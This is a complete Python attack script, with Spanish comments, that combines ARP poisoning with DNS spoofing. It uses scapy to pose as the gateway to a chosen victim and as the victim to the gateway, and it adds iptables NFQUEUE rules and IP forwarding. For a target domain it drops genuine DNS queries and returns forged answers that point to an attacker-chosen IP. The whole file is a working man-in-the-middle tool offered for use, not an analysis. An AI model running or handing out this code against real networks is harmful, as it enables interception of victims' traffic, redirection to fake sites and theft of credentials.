#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, os, time, threading, subprocess, argparse
from scapy.all import (ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR,
                        send, sendp, srp, conf, get_if_hwaddr)
conf.verb = 0

if os.geteuid() != 0:
    sys.exit("[!] Requiere root: sudo python3 script.py")

from netfilterqueue import NetfilterQueue

QUEUE_NUM = 1
stop_flag = threading.Event()

def get_mac(ip, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                  timeout=2, iface=iface, retry=2)
    for _, r in ans:
        return r.hwsrc
    return None

def arp_poison(victim_ip, gateway_ip, iface, attacker_mac):
    victim_mac  = get_mac(victim_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    if not victim_mac or not gateway_mac:
        sys.exit("[!] No se pudo resolver MAC de víctima o gateway")

    print(f"[*] Víctima  {victim_ip} -> {victim_mac}")
    print(f"[*] Gateway  {gateway_ip} -> {gateway_mac}")

    while not stop_flag.is_set():
        # Decir a la víctima: "yo soy el gateway"
        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                 psrc=gateway_ip, hwsrc=attacker_mac), iface=iface)
        # Decir al gateway: "yo soy la víctima"
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                 psrc=victim_ip, hwsrc=attacker_mac), iface=iface)
        time.sleep(2)

    # Restaurar tablas ARP al salir
    real_victim_mac  = get_mac(victim_ip, iface)
    real_gateway_mac = get_mac(gateway_ip, iface)
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
             psrc=gateway_ip, hwsrc=real_gateway_mac), count=4, iface=iface)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=victim_ip, hwsrc=real_victim_mac), count=4, iface=iface)
    print("[*] Tablas ARP restauradas")

def set_iptables(enable, victim=None):
    action = "-A" if enable else "-D"
    chains = ["FORWARD", "OUTPUT"]
    for chain in chains:
        rule = ["iptables", action, chain, "-p", "udp", "--dport", "53",
                "-j", "NFQUEUE", "--queue-num", str(QUEUE_NUM)]
        if victim and chain == "FORWARD":
            rule = ["iptables", action, chain, "-p", "udp", "--dport", "53",
                    "-s", victim, "-j", "NFQUEUE", "--queue-num", str(QUEUE_NUM)]
        subprocess.run(rule, check=False)
    if enable:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                        check=False, capture_output=True)
        print(f"[*] iptables + ip_forward activos")
    else:
        print(f"[*] iptables limpiadas")

def make_dns_callback(target_domain, redirect_ip):
    if not target_domain.endswith('.'):
        target_domain += '.'
    target_bytes = target_domain.encode()

    def callback(packet):
        pkt = IP(packet.get_payload())
        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0 or not pkt[DNS].qd:
            packet.accept(); return

        qname = pkt[DNS].qd.qname
        if qname == target_bytes or qname.endswith(b'.' + target_bytes):
            print(f"[+] Spoofing {qname.decode()} -> {redirect_ip}")
            spoofed = (IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                       UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                       DNS(id=pkt[DNS].id, qr=1, aa=1, rd=pkt[DNS].rd, ra=1,
                           qd=pkt[DNS].qd,
                           an=DNSRR(rrname=qname, type="A", rclass="IN",
                                    ttl=300, rdata=redirect_ip)))
            send(spoofed, verbose=False)
            packet.drop()
        else:
            packet.accept()
    return callback

def main():
    p = argparse.ArgumentParser()
    p.add_argument("-i", "--interface", required=True)
    p.add_argument("-d", "--domain", required=True)
    p.add_argument("-r", "--redirect-ip", required=True)
    p.add_argument("--victim", required=True, help="IP de la víctima")
    p.add_argument("--gateway", required=True, help="IP del gateway")
    args = p.parse_args()

    attacker_mac = get_if_hwaddr(args.interface)

    print(f"[*] Interfaz : {args.interface}")
    print(f"[*] Dominio  : {args.domain}")
    print(f"[*] Redirect : {args.redirect_ip}")
    print(f"[*] Víctima  : {args.victim}")
    print(f"[*] Gateway  : {args.gateway}\n")

    # 1. Hilo de ARP poisoning
    arp_thread = threading.Thread(
        target=arp_poison,
        args=(args.victim, args.gateway, args.interface, attacker_mac),
        daemon=True)
    arp_thread.start()

    # 2. iptables + NFQUEUE
    set_iptables(True, args.victim)
    nfq = NetfilterQueue()
    nfq.bind(QUEUE_NUM, make_dns_callback(args.domain, args.redirect_ip))

    print("[*] ARP Spoofing activo. Esperando queries DNS...")
    print("    Ctrl+C para detener\n")

    try:
        nfq.run()
    except KeyboardInterrupt:
        print("\n[*] Deteniendo...")
    finally:
        stop_flag.set()
        nfq.unbind()
        set_iptables(False, args.victim)
        time.sleep(3)  # dar tiempo a restaurar ARP
        print("[*] Limpieza completa.")

if __name__ == "__main__":
    main()
